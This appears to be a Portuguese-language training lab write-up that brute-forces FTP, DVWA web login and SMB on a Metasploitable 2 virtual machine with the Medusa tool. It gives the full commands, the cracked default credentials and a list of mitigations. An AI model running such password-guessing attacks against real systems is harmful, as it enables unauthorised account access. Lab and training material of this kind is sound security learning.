# Desafio DIO – Ataques de Força Bruta com Medusa

## Serviços Identificados no Metasploitable 2
  - FTP (porta 21)
  - SSH (porta 22)
  - HTTP - DVWA (porta 80)
  - SMB (portas 139/445)

## 1. Ataque ao Serviço FTP

### Comando:
medusa -h 192.168.56.101 -u msfadmin -P wordlist_ftp.txt -M ftp -t 4

### Resultado:

ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

Credenciais encontradas: msfadmin:msfadmin
Vulnerabilidade: Uso de credenciais padrão
Impacto: Permite acesso ao sistema via FTP com privilégios do usuário msfadmin

## Ataque ao Serviço HTTP (DVWA)

### Comando:
medusa -h 192.168.56.101 -u admin -P wordlist_dvwa.txt -M http -m FORM:dvwa_login -m DIR:/dvwa/login.php -m DENY-SIGNAL:"Login failed" -t 3

### Resultado:
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: admin [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: admin123 [SUCCESS]

Credenciais encontradas: admin:password
Vulnerabilidade: Senha padrão não alterada e fracas
Impacto: Acesso total ao painel da DVWA, comprometendo o ambiente web

## Ataque ao Serviço SMB

### Comando:
medusa -h 192.168.56.101 -U users.txt -P wordlist_smb.txt -M smbnt -t 2

### Resultado:
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]

Credenciais encontradas: msfadmin:msfadmin
Vulnerabilidade: Conta SMB com senha padrão
Impacto: Possível acesso remoto e compartilhamento de arquivos administrativos

## Conclusão
Durante os testes de força bruta com o Medusa, foram identificadas diversas senhas fracas e credenciais padrão nos serviços FTP, HTTP (DVWA) e SMB do Metasploitable 2.
Essas falhas demonstram a importância de políticas de segurança de senhas, mudança de credenciais padrão e restrição de acessos remotos.

## Recomendações de Mitigações:

  - Alterar imediatamente senhas padrão.
  - Implementar autenticação multifator (MFA).
  - Utilizar listas de senhas seguras.
  - Limitar tentativas de login (bloqueio temporário).
  - Monitorar logs de autenticação suspeitos.
